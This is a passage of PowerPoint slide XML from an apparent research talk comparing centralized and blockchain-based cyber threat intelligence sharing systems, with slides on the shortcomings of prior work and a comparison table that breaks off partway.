          <p:cNvPr id="6" name="central subheading"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1737360"/>
            <a:ext cx="3383280" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A trusted server does the matching</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="central list"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2194560"/>
            <a:ext cx="3383280" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>MISP [1]  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Servers sync in pairs; new members must be admitted.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>STIX / TAXII [2], [3]  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Common data format and client–server transport.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="family divider"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4251960" y="1417320"/>
            <a:ext cx="9144" cy="3063240"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="blockchain heading"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="1371600"/>
            <a:ext cx="4023360" cy="365760"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Blockchain-based sharing</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="blockchain subheading"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="1737360"/>
            <a:ext cx="4023360" cy="292608"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" i="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent3"/>
                </a:solidFill>
              </a:rPr>
              <a:t>A shared ledger, plus logic on top</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="blockchain list"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4572000" y="2194560"/>
            <a:ext cx="4023360" cy="2286000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TRADE [5]  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Peer-to-peer exchange; the producer controls sharing.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>TrustShare [6]  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>On-chain records plus access control.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Dunnett et al. [7]  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Verifiable, differential sharing framework.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>BFLS [9]  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Shares detection models through federated learning.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Otoum et al. [10]  </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:spcAft>
                <a:spcPts val="800"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>IoT honeypots coordinated by a trust-aware ledger.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PRIOR WORK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Where prior work falls short</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Logic lives on-chain icon" descr="Logic lives on-chain">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1463040"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="gap 1 header"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2057400"/>
            <a:ext cx="2423160" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Logic lives on-chain</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="gap 1 body"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2788920"/>
            <a:ext cx="2377440" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Smart contracts for reputation, access and membership add code everyone must trust, and blur what the ledger itself provides.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="gap rule 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3154680" y="1463040"/>
            <a:ext cx="9144" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="9" name="Joining needs permission icon" descr="Joining needs permission">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="1463040"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="gap 2 header"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="2057400"/>
            <a:ext cx="2423160" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Joining needs permission</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="gap 2 body"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3291840" y="2788920"/>
            <a:ext cx="2377440" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>New members must be admitted or configured before they receive anything.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="gap rule 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5897880" y="1463040"/>
            <a:ext cx="9144" cy="3017520"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="9525">
            <a:solidFill>
              <a:schemeClr val="accent4"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="13" name="Costs and attacks unmeasured icon" descr="Costs and attacks unmeasured">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="1463040"/>
            <a:ext cx="411480" cy="411480"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="gap 3 header"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="2057400"/>
            <a:ext cx="2423160" cy="685800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Costs and attacks unmeasured</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="gap 3 body"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6035040" y="2788920"/>
            <a:ext cx="2377440" cy="1691640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>The designs we compare against don't report measured fees, speed limits or cheating participants.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Slide Number Placeholder 0"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4294967295"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8138160" y="475488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046720" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>PRIOR WORK</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 0"/>
          <p:cNvSpPr/>
          <p:nvPr>
            <p:ph idx="101" type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="603504"/>
            <a:ext cx="8046720" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2800" b="1" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Side-by-side with prior work</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="11" name="comparison table"/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr>
            <p:extLst>
              <p:ext uri="{D42A27DB-BD31-4B8C-83A1-F6EECF244321}">
                <p14:modId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1579011935"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="548640" y="1417320"/>
          <a:ext cx="8046720" cy="914400"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="2560320"/>
                <a:gridCol w="1371600"/>
                <a:gridCol w="1371600"/>
                <a:gridCol w="1371600"/>
                <a:gridCol w="1371600"/>
              </a:tblGrid>
              <a:tr h="420624">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>System</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="bg2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>No trusted coordinator</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="Calibri" charset="0"/>
                        <a:ea typeface="Calibri" charset="0"/>
                        <a:cs typeface="Calibri" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="91440" marR="73152" marT="36576" marB="36576" anchor="ctr">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="9525" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="D9DCE1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:schemeClr val="bg2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr algn="l" indent="0" marL="0">
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="tx1"/>
                          </a:solidFill>
                          <a:latin typeface="Calibri" pitchFamily="34" charset="0"/>
                          <a:ea typeface="Calibri" pitchFamily="34" charset="-122"/>
                          <a:cs typeface="Calibri" pitchFamily="34" charset="-120"/>
                        </a:rPr>
                        <a:t>Joins from ledger alone</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
